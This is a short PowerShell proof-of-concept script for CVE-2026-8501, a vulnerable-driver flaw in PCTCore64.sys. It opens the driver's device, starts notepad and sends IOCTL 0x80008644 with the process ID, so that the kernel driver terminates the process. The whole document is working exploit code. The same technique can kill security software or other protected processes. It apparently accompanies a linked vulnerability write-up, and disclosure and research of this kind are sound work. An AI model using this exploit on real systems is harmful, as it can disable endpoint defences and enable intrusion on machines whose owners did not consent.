Clear-Host
Write-Host

# CVE-2026-8501: Arbitrary Process Termination in PCTCore64.sys
# https://blacksnufkin.github.io/posts/BYOVD-CVE-2026-8501/

try {
    $Handle   = Get-FileHandle -FileName PCTcore64 -AlternativeName PCTCoreDevice -Symbolic Device
    $ProcID   = Start-Process notepad -PassThru | select -ExpandProperty Id
    $inOutPtr = New-IntPtr -Size $readSize -TypeSize ([Int64], [Int64]) -Values ($ProcID, 0L)
    Invoke-IoctlCall -Mode 0 -FileHandle $Handle -IoCtrlCode 0x80008644 -InOutPtr $inOutPtr -InputSize 16 -OutputSize 0
    Free-IntPtr $inOutPtr -Method Auto
}
finally {
    Free-IntPtr $Handle -Method NtHandle
}